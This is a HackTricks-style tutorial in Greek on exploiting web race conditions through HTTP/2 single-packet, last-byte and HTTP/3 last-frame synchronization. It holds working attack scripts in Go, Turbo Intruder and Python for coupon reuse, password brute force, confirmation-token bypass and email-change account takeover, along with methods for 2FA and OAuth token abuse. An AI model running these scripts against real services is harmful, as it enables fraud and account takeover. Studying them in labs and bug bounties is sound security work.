# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Για να αποκτήσετε βαθύτερη κατανόηση αυτής της τεχνικής, δείτε την αρχική αναφορά στο [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Enhancing Race Condition Attacks

Το κύριο εμπόδιο στο να εκμεταλλευτείτε race conditions είναι να βεβαιωθείτε ότι πολλαπλά requests επεξεργάζονται ταυτόχρονα, με πολύ μικρή διαφορά στους χρόνους επεξεργασίας τους — ιδανικά, λιγότερο από 1ms.

Εδώ θα βρείτε μερικές τεχνικές για τον συγχρονισμό των requests:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Επιτρέπει την αποστολή δύο requests πάνω σε μια TCP σύνδεση, μειώνοντας την επίδραση του network jitter. Ωστόσο, λόγω μεταβλητότητας στο server-side, δύο requests ενδέχεται να μην αρκούν για αξιόπιστη εκμετάλλευση race condition.
- **HTTP/1.1 'Last-Byte Sync'**: Επιτρέπει το προ-αποστολή των περισσότερων μερών 20–30 requests, κρατώντας ένα μικρό κομμάτι πίσω, το οποίο αποστέλλεται μαζί, επιτυγχάνοντας ταυτόχρονη άφιξη στον server.

Η προετοιμασία για Last-Byte Sync περιλαμβάνει:

1. Αποστολή headers και σώματος μείον το τελικό byte χωρίς να κλείσετε το stream.
2. Παύση για 100ms μετά την αρχική αποστολή.
3. Απενεργοποίηση του TCP_NODELAY για να χρησιμοποιηθεί ο αλγόριθμος Nagle για ομαδοποίηση τελικών frames.
4. Ping για «ζέσταμα» της σύνδεσης.

Η επακόλουθη αποστολή των συγκρατημένων frames θα πρέπει να έχει ως αποτέλεσμα την άφιξή τους σε ένα μόνο packet, κάτι που μπορεί να επαληθευτεί με Wireshark. Αυτή η μέθοδος δεν εφαρμόζεται σε static files, τα οποία συνήθως δεν εμπλέκονται σε RC attacks.

#### HTTP/3 Last‑Frame Synchronization (QUIC)

- **Concept**: Το HTTP/3 τρέχει πάνω από QUIC (UDP). Δεν υπάρχει TCP coalescing ή Nagle να στηριχτείτε, οπότε το κλασικό last‑byte sync δεν δουλεύει με off‑the‑shelf πελάτες. Αντίθετα, χρειάζεται σκόπιμη συγχώνευση πολλαπλών QUIC stream‑final DATA frames (FIN) στο ίδιο UDP datagram ώστε ο server να επεξεργαστεί όλα τα στοχευμένα requests στο ίδιο scheduling tick.
- **How to do it**: Χρησιμοποιήστε μια ειδικά κατασκευασμένη βιβλιοθήκη που δίνει έλεγχο στα QUIC frames. Για παράδειγμα, το H3SpaceX χειρίζεται το quic-go για να υλοποιήσει HTTP/3 last‑frame synchronization τόσο για requests με σώμα όσο και για GET‑style requests χωρίς σώμα.
- Requests‑with‑body: στείλτε HEADERS + DATA μείον το τελευταίο byte για N streams, στη συνέχεια flush τα τελευταία bytes κάθε stream μαζί.
- GET‑style: κατασκευάστε ψεύτικα DATA frames (ή ένα μικρό body με Content‑Length) και τερματίστε όλα τα streams σε ένα datagram.
- **Practical limits**:
  - Η concurrency περιορίζεται από το peer’s QUIC max_streams transport parameter (παρόμοιο με HTTP/2’s SETTINGS_MAX_CONCURRENT_STREAMS). Αν είναι χαμηλό, ανοίξτε πολλαπλές H3 connections και διασπείρετε το race ανάμεσά τους.
  - Το μέγεθος του UDP datagram και το path MTU περιορίζουν πόσα stream‑final frames μπορείτε να συγχωνεύσετε. Η βιβλιοθήκη χειρίζεται το σπάσιμο σε πολλαπλά datagrams εάν χρειαστεί, αλλά ένα flush σε single‑datagram είναι το πιο αξιόπιστο.
- **Practice**: Υπάρχουν public H2/H3 race labs και δείγματα exploits που συνοδεύουν το H3SpaceX.

<details>
<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) minimal example</summary>
```go
package main
import (
"crypto/tls"
"context"
"time"
"github.com/nxenon/h3spacex"
h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
var reqs []*http.Request
for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
// keep last byte (1), sleep 150ms, set Content-Length
h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```
</details>

### Προσαρμογή στην αρχιτεκτονική του διακομιστή

Η κατανόηση της αρχιτεκτονικής του στόχου είναι κρίσιμη. Οι front-end servers μπορεί να δρομολογούν τα requests διαφορετικά, επηρεάζοντας το timing. Η προληπτική προθέρμανση των συνδέσεων από την πλευρά του server, μέσω ασήμαντων requests, μπορεί να εξομαλύνει το χρόνο ανταπόκρισης.

#### Αντιμετώπιση Session-Based Locking

Frameworks όπως PHP's session handler σειριοποιούν τα requests ανά session, κάτι που μπορεί να καλύψει ευπάθειες. Χρησιμοποιώντας διαφορετικά session tokens για κάθε request μπορείτε να παρακάμψετε αυτό το πρόβλημα.

#### Αντιμετώπιση ορίων ρυθμού ή πόρων

Εάν η προθέρμανση συνδέσεων είναι αναποτελεσματική, η πρόκληση καθυστερήσεων από τα rate ή resource limits των web servers με κύμα dummy requests μπορεί να διευκολύνει το single-packet attack, προκαλώντας μια server-side καθυστέρηση που ευνοεί race conditions.

## Παραδείγματα Επιθέσεων

- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: Μπορείτε να στείλετε το request στο **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), να αλλάξετε μέσα στο request την τιμή που θέλετε να brute force για **`%s`** όπως στο `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` και στη συνέχεια να επιλέξετε το **`examples/race-single-packer-attack.py`** από το drop down:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Αν πρόκειται να **στείλετε διαφορετικές τιμές**, μπορείτε να τροποποιήσετε τον κώδικα με αυτόν που χρησιμοποιεί ένα wordlist από το clipboard:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Αν ο ιστότοπος δεν υποστηρίζει HTTP2 (μόνο HTTP1.1) χρησιμοποιήστε `Engine.THREADED` ή `Engine.BURP` αντί για `Engine.BURP2`.

- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: Σε περίπτωση που χρειαστεί να στείλετε ένα αίτημα σε 1 endpoint και μετά πολλά σε άλλα endpoints για να προκαλέσετε το RCE, μπορείτε να αλλάξετε το `race-single-packet-attack.py` script με κάτι σαν:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Είναι επίσης διαθέσιμο στο **Repeater** μέσω της νέας επιλογής '**Send group in parallel**' στο **Burp Suite**.
- Για **limit-overrun** μπορείτε απλώς να προσθέσετε το **ίδιο request 50 φορές** στην ομάδα.
- Για **connection warming**, μπορείτε να **προσθέσετε** στην **αρχή** της **ομάδας** μερικά **requests** σε κάποιο μη στατικό μέρος του web server.
- Για **delaying** της διαδικασίας **μεταξύ** της επεξεργασίας **ενός request και ενός άλλου** σε βήματα με 2 substates, μπορείτε να **προσθέσετε επιπλέον requests ανάμεσα** στα δύο requests.
- Για ένα **multi-endpoint** RC μπορείτε να ξεκινήσετε στέλνοντας το **request** που **πηγαίνει στην κρυφή κατάσταση** και έπειτα **50 requests** αμέσως μετά που **εκμεταλλεύονται την κρυφή κατάσταση**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Ο στόχος αυτού του script είναι να αλλάξει το email ενός χρήστη ενώ το επαληθεύει συνεχώς μέχρι το verification token του νέου email να φτάσει στο τελευταίο email (αυτό συμβαίνει επειδή στον κώδικα υπήρχε ένα RC όπου ήταν δυνατόν να τροποποιηθεί ένα email αλλά η επαλήθευση να σταλεί στο παλιό, επειδή η μεταβλητή που υποδεικνύει το email είχε ήδη συμπληρωθεί με το πρώτο).\
Όταν η λέξη "objetivo" βρεθεί στα ληφθέντα emails γνωρίζουμε ότι λάβαμε το verification token του αλλαγμένου email και τερματίζουμε την επίθεση.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: "+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: "+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: σημειώσεις για engine και gating

- Επιλογή engine: χρησιμοποιήστε `Engine.BURP2` σε HTTP/2 targets για να ενεργοποιήσετε το single‑packet attack· fallback σε `Engine.THREADED` ή `Engine.BURP` για HTTP/1.1 last‑byte sync.
- `gate`/`openGate`: τοποθετήστε στην ουρά πολλά αντίγραφα με `gate='race1'` (ή per‑attempt gates), που συγκρατούν το tail κάθε request· `openGate('race1')` ξεφορτώνει όλα τα tails μαζί ώστε να φτάσουν σχεδόν ταυτόχρονα.
- Διαγνωστικά: αρνητικά timestamps στο Turbo Intruder δείχνουν ότι ο server απάντησε πριν το request σταλεί πλήρως, αποδεικνύοντας overlap. Αυτό είναι αναμενόμενο σε πραγματικά races.
- Connection warming: στείλτε ένα ping ή μερικά harmless requests πρώτα για να σταθεροποιήσετε τα timings· προαιρετικά απενεργοποιήστε `TCP_NODELAY` για να ενθαρρύνετε το batching των τελικών frames.


### Βελτίωση του Single Packet Attack

Στην αρχική έρευνα εξηγείται ότι αυτή η επίθεση έχει όριο 1,500 bytes. Ωστόσο, στο [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), εξηγείται πώς είναι δυνατόν να επεκταθεί ο περιορισμός των 1,500 bytes του single packet attack στο όριο παραθύρου των 65,535 B του TCP χρησιμοποιώντας IP layer fragmentation (splitting a single packet into multiple IP packets) και στέλνοντάς τα σε διαφορετική σειρά, γεγονός που επιτρέπει να μην γίνει reassembling του packet μέχρι να φτάσουν όλα τα fragments στον server. Αυτή η τεχνική επέτρεψε στον ερευνητή να στείλει 10,000 requests σε περίπου 166ms.

Σημειώστε ότι, αν και αυτή η βελτίωση κάνει την επίθεση πιο αξιόπιστη σε RC που απαιτεί εκατοντάδες/χιλιάδες πακέτα να φτάσουν την ίδια στιγμή, μπορεί επίσης να έχει κάποιους περιορισμούς στο λογισμικό. Κάποιοι δημοφιλείς HTTP servers όπως οι Apache, Nginx και Go έχουν αυστηρή ρύθμιση `SETTINGS_MAX_CONCURRENT_STREAMS` στις 100, 128 και 250. Ωστόσο, άλλοι όπως NodeJS και nghttp2 την έχουν απεριόριστη.\
Αυτό πρακτικά σημαίνει ότι ο Apache θα θεωρεί μόνο 100 HTTP connections από μια μοναδική TCP σύνδεση (περιορίζοντας αυτή την RC επίθεση). Για HTTP/3, το ανάλογο όριο είναι το transport parameter max_streams του QUIC — αν είναι μικρό, διασπείρετε το race σας σε πολλαπλές QUIC συνδέσεις.

Μπορείτε να βρείτε κάποια παραδείγματα που χρησιμοποιούν αυτή την τεχνική στο repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Πριν την προηγούμενη έρευνα, αυτά ήταν μερικά payloads που χρησιμοποιούνταν και απλώς προσπαθούσαν να στείλουν τα πακέτα όσο το δυνατόν πιο γρήγορα για να προκαλέσουν ένα RC.

- **Repeater:** Δείτε τα παραδείγματα από την προηγούμενη ενότητα.
- **Intruder**: Στείλτε το **request** στο **Intruder**, ορίστε το **number of threads** σε **30** μέσα στο **Options menu**, επιλέξτε ως payload **Null payloads** και δημιουργήστε **30**.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Μεθοδολογία**

### Limit-overrun / TOCTOU

Αυτός είναι ο πιο βασικός τύπος race condition, όπου εμφανίζονται **ευπάθειες** σε σημεία που **περιορίζουν τον αριθμό των φορών που μπορείτε να εκτελέσετε μια ενέργεια**. Όπως η χρήση του ίδιου κωδικού έκπτωσης σε ένα web store αρκετές φορές. Ένα πολύ απλό παράδειγμα μπορεί να βρεθεί σε [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ή σε [**this bug**](https://hackerone.com/reports/759247)**.**

Υπάρχουν πολλές παραλλαγές αυτού του είδους επίθεσης, συμπεριλαμβανομένων:

- Εξαργύρωση κάρτας δώρου πολλαπλές φορές
- Βαθμολόγηση προϊόντος πολλές φορές
- Ανάληψη ή μεταφορά μετρητών πέρα από το υπόλοιπο του λογαριασμού
- Επαναχρησιμοποίηση μιας μοναδικής λύσης CAPTCHA
- Παράκαμψη ενός anti-brute-force rate limit

### **Κρυφές υποστάσεις**

Η εκμετάλλευση πολύπλοκων race conditions συχνά περιλαμβάνει την εκμετάλλευση σύντομων ευκαιριών για αλληλεπίδραση με κρυφές ή **μη επιδιωκόμενες υποστάσεις μηχανής**. Πώς να το προσεγγίσετε:

1. **Εντοπίστε Πιθανές Κρυφές Υποστάσεις**
- Ξεκινήστε εντοπίζοντας endpoints που τροποποιούν ή αλληλεπιδρούν με κρίσιμα δεδομένα, όπως user profiles ή password reset processes. Επικεντρωθείτε σε:
- **Storage**: Προτιμήστε endpoints που χειρίζονται server-side persistent data αντί για αυτά που χειρίζονται δεδομένα client-side.
- **Action**: Αναζητήστε λειτουργίες που αλλάζουν υπάρχοντα δεδομένα, οι οποίες είναι πιο πιθανό να δημιουργήσουν εκμεταλλεύσιμες συνθήκες σε σχέση με αυτές που προσθέτουν νέα δεδομένα.
- **Keying**: Επιτυχημένες επιθέσεις συνήθως περιλαμβάνουν λειτουργίες που χρησιμοποιούν τον ίδιο identifier, π.χ. username ή reset token.
2. **Διεξάγετε Αρχική Δοκιμή**
- Δοκιμάστε τα εντοπισμένα endpoints με race condition επιθέσεις, παρατηρώντας τυχόν αποκλίσεις από τα αναμενόμενα αποτελέσματα. Ανεπιθύμητες αποκρίσεις ή αλλαγές στη συμπεριφορά της εφαρμογής μπορεί να υποδηλώνουν ευπάθεια.
3. **Επιδείξτε την Ευπάθεια**
- Περιορίστε την επίθεση στον ελάχιστο αριθμό αιτημάτων που απαιτούνται για να εκμεταλλευτείτε την ευπάθεια, συχνά μόνο δύο. Αυτό το βήμα μπορεί να απαιτήσει πολλαπλές προσπάθειες ή αυτοματοποίηση λόγω της ακριβούς χρονιστικής απαιτήσης.

### Time Sensitive Attacks

Η ακρίβεια στον χρονισμό των αιτημάτων μπορεί να αποκαλύψει ευπάθειες, ειδικά όταν χρησιμοποιούνται προβλέψιμες μέθοδοι όπως timestamps για security tokens. Για παράδειγμα, η δημιουργία password reset tokens βασισμένων σε timestamps μπορεί να επιτρέψει ίδια tokens για ταυτόχρονες αιτήσεις.

**Για να εκμεταλλευτείτε:**

- Χρησιμοποιήστε ακριβή χρονισμό, όπως μια single packet attack, για να κάνετε concurrent password reset requests. Ιδίου περιεχομένου tokens υποδηλώνουν ευπάθεια.

**Παράδειγμα:**

- Ζητήστε δύο password reset tokens ταυτόχρονα και συγκρίνετέ τα. Αν ταιριάζουν, αυτό προτείνει σφάλμα στη δημιουργία tokens.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Μελέτες περίπτωσης κρυφών υποστάσεων

### Pay & add an Item

Check this [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) to see how to **pay** in a store and **add an extra** item you that **won't need to pay for it**.

### Confirm other emails

Η ιδέα είναι να **επιβεβαιώσετε μια διεύθυνση email και να την αλλάξετε σε άλλη ταυτόχρονα** για να διαπιστώσετε αν η πλατφόρμα επιβεβαιώνει τη νέα διεύθυνση.

### Change email to 2 emails addresses Cookie based

Σύμφωνα με [**this research**](https://portswigger.net/research/smashing-the-state-machine) το Gitlab ήταν ευάλωτο σε takeover με αυτόν τον τρόπο επειδή μπορεί να **στείλει** το **email verification token από ένα email στο άλλο**.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Hidden Database states / Confirmation Bypass

Εάν χρησιμοποιούνται **2 διαφορετικές εγγραφές** για να **προσθέσουν** **πληροφορίες** σε μια **βάση δεδομένων**, υπάρχει ένα μικρό χρονικό διάστημα όπου **μόνο τα πρώτα δεδομένα έχουν γραφτεί** στη βάση. Για παράδειγμα, κατά τη δημιουργία χρήστη το **username** και το **password** μπορεί να **γραφούν** και **μετά** να γραφεί το token για την επιβεβαίωση του νεοδημιουργημένου λογαριασμού. Αυτό σημαίνει ότι για ένα μικρό χρονικό διάστημα το **token για την επιβεβαίωση ενός λογαριασμού είναι null**.

Επομένως, η εγγραφή ενός λογαριασμού και η αποστολή πολλαπλών αιτημάτων με κενό token (`token=` ή `token[]=` ή οποιαδήποτε άλλη παραλλαγή) για άμεση επιβεβαίωση του λογαριασμού θα μπορούσε να επιτρέψει να **επιβεβαιώσετε έναν λογαριασμό** όπου δεν ελέγχετε το email.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Bypass 2FA

The following pseudo-code is vulnerable to race condition because in a very small time the **2FA is not enforced** while the session is created:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 αιώνια διατήρηση

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Αυτές οι υπηρεσίες θα σας επιτρέψουν να δημιουργήσετε μια εφαρμογή και να πιστοποιήσετε χρήστες που έχει καταχωρήσει ο provider. Για να γίνει αυτό, ο **client** θα χρειαστεί να **επιτρέψει στην εφαρμογή σας** να έχει πρόσβαση σε κάποια από τα δεδομένα τους μέσα στον **OAUth provider**.\
Έτσι, μέχρι εδώ απλά ένα κοινό login με google/linkedin/github... όπου σας εμφανίζεται μια σελίδα που λέει: "_Η εφαρμογή <InsertCoolName> θέλει να έχει πρόσβαση στις πληροφορίες σας, θέλετε να το επιτρέψετε;_"

#### Race Condition στο `authorization_code`

Το **πρόβλημα** εμφανίζεται όταν **το αποδέχεστε** και αυτόματα αποστέλλεται ένα **`authorization_code`** στην κακόβουλη εφαρμογή. Στη συνέχεια, αυτή η **εφαρμογή καταχράται μια Race Condition στον OAUth service provider για να δημιουργήσει περισσότερα από ένα AT/RT** (_Authentication Token/Refresh Token_) από το **`authorization_code`** για τον λογαριασμό σας. Βασικά, θα εκμεταλλευτεί το ότι αποδεχτήκατε την εφαρμογή να έχει πρόσβαση στα δεδομένα σας για να **δημιουργήσει πολλούς λογαριασμούς**. Έπειτα, αν **παύσετε να επιτρέπετε** στην εφαρμογή την πρόσβαση στα δεδομένα σας ένα ζεύγος AT/RT θα διαγραφεί, αλλά τα υπόλοιπα θα παραμείνουν έγκυρα.

#### Race Condition στο `Refresh Token`

Μόλις αποκτήσετε ένα έγκυρο RT μπορείτε να προσπαθήσετε να το καταχραστείτε για να δημιουργήσετε πολλαπλά AT/RT και **ακόμα κι αν ο χρήστης ακυρώσει τα δικαιώματα** της κακόβουλης εφαρμογής να έχει πρόσβαση στα δεδομένα του, **πολλαπλά RT θα παραμείνουν έγκυρα.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) you can find a PoC in Java to send websocket messages in **parallel** to abuse **Race Conditions also in Web Sockets**.
- With Burp’s WebSocket Turbo Intruder you can use the **THREADED** engine to spawn multiple WS connections and fire payloads in parallel. Start from the official example and tune `config()` (thread count) for concurrency; this is often more reliable than batching on a single connection when racing server‑side state across WS handlers. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## Αναφορές

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)

{{#include ../banners/hacktricks-training.md}}
